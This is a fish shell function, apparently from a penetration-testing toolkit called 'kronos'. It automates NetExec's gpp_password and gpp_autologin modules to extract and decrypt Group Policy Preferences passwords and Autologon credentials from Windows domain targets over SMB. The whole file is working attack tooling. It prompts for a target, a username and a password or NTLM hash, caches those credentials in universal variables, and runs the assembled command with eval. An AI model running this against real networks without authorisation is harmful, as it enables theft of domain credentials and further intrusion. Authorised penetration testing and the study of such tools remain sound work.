# description: Extract GPP passwords or Autologon registries using nxc modules
function __kronos_gpp --description "Extract GPP passwords or Autologon registries using nxc modules"
    set -l wizard 0
    if test (count $argv) -eq 0
        set wizard 1
    end

    argparse t/target= h/help q/quiet u/username= p/password= H/hash= d/domain= k/kerberos m/gpp-password a/autologin X/edit-cmd w/wizard -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos gpp [OPTIONS]"
        echo ""
        echo "Extract and decrypt GPP passwords or Autologon registries using nxc smb."
        echo ""
        echo "Options:"
        echo "  -t, --target IP         Target IP or Hostname"
        echo "  -m, --gpp-password     Scan for GPP passwords (gpp_password module)"
        echo "  -a, --autologin        Scan for Autologon registries (gpp_autologin module)"
        echo "  -u, --username USER     Auth username"
        echo "  -p, --password PASS     Auth password"
        echo "  -H, --hash HASH         Auth NTLM hash"
        echo "  -d, --domain DOMAIN     Target domain name"
        echo "  -k, --kerberos          Use Kerberos authentication"
        echo "  -X, --edit-cmd          Inspect and edit the command before execution"
        echo "  -q, --quiet             Skip prompts and use cached/default values"
        echo "  -h, --help              Show this help message"
        return 0
    end

    set -l target $_flag_target
    if test -z "$target"; and test (count $argv) -gt 0
        set target $argv[1]
    end
    set -l domain $_flag_domain
    set -l auth_user $_flag_username
    set -l auth_pass $_flag_password
    set -l auth_hash $_flag_hash
    
    set -l do_gpp 0
    if set -q _flag_gpp_password; set do_gpp 1; end
    set -l do_autologin 0
    if set -q _flag_autologin; set do_autologin 1; end

    # 1. Target Resolution
    set -l def_target "$__KRONOS_CACHE_GPP_TARGET"
    set -l src_target "Cache"
    if test -z "$def_target"
        set def_target "$TGT"; set src_target "TGT"
        if test -z "$def_target"; set def_target "$TGT_DC_IP"; set src_target "TGT_DC_IP"; end
        if test -z "$def_target"; set def_target "$TGT_DC"; set src_target "TGT_DC"; end
        if test -z "$def_target"; set def_target "$TGT_HOSTS[1]"; set src_target "TGT_HOSTS"; end
    end
    if test -n "$target"; set def_target "$target"; set src_target "CLI Arg"; end

    if not set -q _flag_quiet
        if test "$wizard" -eq 1 -o -z "$target"; or set -q _flag_wizard
            set_color cyan; echo "[*] Starting GPP Extraction wizard..."; set_color normal
            set target (__kronos_ask "Target IP/Hostname" "$def_target" "$src_target"); or return 1
            set -U __KRONOS_CACHE_GPP_TARGET "$target"

            # 2. Authentication
            if not set -q _flag_kerberos; and test -z "$auth_user"
                set -l def_user "$__KRONOS_CACHE_GPP_AUTH_USER"
                set -l src_user "Cache"
                if test -z "$def_user"
                    set def_user "$TGT_USERNAME"; set src_user "TGT_USERNAME"
                    if test -z "$def_user"; set def_user "$TGT_CRED_USERNAME"; set src_user "TGT_CRED_USERNAME"; end
                end
                set auth_user (__kronos_ask "Auth Username" "$def_user" "$src_user"); or return 1
                set -U __KRONOS_CACHE_GPP_AUTH_USER "$auth_user"

                set -l def_auth_val "$__KRONOS_CACHE_GPP_AUTH_VAL"
                set -l src_auth_val "Cache"
                if test -z "$def_auth_val"
                    set def_auth_val "$TGT_PASSWORD"; set src_auth_val "TGT_PASSWORD"
                end
                if test -n "$auth_pass"; set def_auth_val "$auth_pass"; set src_auth_val "CLI Pass"; end
                if test -n "$auth_hash"; set def_auth_val "$auth_hash"; set src_auth_val "CLI Hash"; end
                set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val" "$src_auth_val"); or return 1
                set -U __KRONOS_CACHE_GPP_AUTH_VAL "$auth_input"
                
                if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
                    set auth_hash "$auth_input"; set auth_pass ""
                else
                    set auth_pass "$auth_input"; set auth_hash ""
                end
            end

            # 3. Domain
            set -l def_domain "$__KRONOS_CACHE_GPP_DOMAIN"
            set -l src_domain "Cache"
            if test -z "$def_domain"
                set def_domain "$TGT_HOSTS[1]"; set src_domain "TGT_HOSTS"
                if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; set src_domain "TGT_DC_DOMAIN"; end
            end
            set domain (__kronos_ask "Domain Name" "$def_domain" "$src_domain"); or return 1
            set -U __KRONOS_CACHE_GPP_DOMAIN "$domain"

            # 4. Modules
            if test "$do_gpp" -eq 0 -a "$do_autologin" -eq 0
                if test (__kronos_ask_confirm "Scan for GPP Passwords?" y) = "yes"
                    set do_gpp 1; end
                if test (__kronos_ask_confirm "Scan for GPP Autologon Registries?" y) = "yes"
                    set do_autologin 1; end
            end
        end
    else
        # Quiet fallbacks
        if test -z "$target"; set target "$__KRONOS_CACHE_GPP_TARGET"; end
        if test -z "$target"; set target $TGT; end
        if test -z "$domain"; set domain $TGT_HOSTS[1]; end
        if test -z "$auth_user"; set auth_user $TGT_USERNAME; end
    end

    if test -z "$target"; echo "error: target is required"; return 1; end
    if test "$do_gpp" -eq 0 -a "$do_autologin" -eq 0; set do_gpp 1; set do_autologin 1; end

    __kronos_check_dep nxc; or return 1

    set -l nxc_base "nxc smb $target"
    if test -n "$domain"; set nxc_base "$nxc_base -d \"$domain\""; end
    
    if set -q _flag_kerberos
        set nxc_base "$nxc_base -k -u \"$auth_user\" -p ''"
    else if test -n "$auth_hash"
        set nxc_base "$nxc_base -u \"$auth_user\" -H \"$auth_hash\""
    else
        set nxc_base "$nxc_base -u \"$auth_user\" -p \"$auth_pass\""
    end

    if test "$do_gpp" -eq 1
        echo ""; set_color cyan; echo "[*] Extracting GPP Passwords (gpp_password module)..."; set_color normal
        set -l cmd "$nxc_base -M gpp_password"
        if set -q _flag_edit_cmd; set cmd (__kronos_edit_cmd "$cmd"); or return 1; end
        eval $cmd
    end

    if test "$do_autologin" -eq 1
        echo ""; set_color cyan; echo "[*] Extracting GPP Autologon Registries (gpp_autologin module)..."; set_color normal
        set -l cmd "$nxc_base -M gpp_autologin"
        if set -q _flag_edit_cmd; set cmd (__kronos_edit_cmd "$cmd"); or return 1; end
        eval $cmd
    end
end
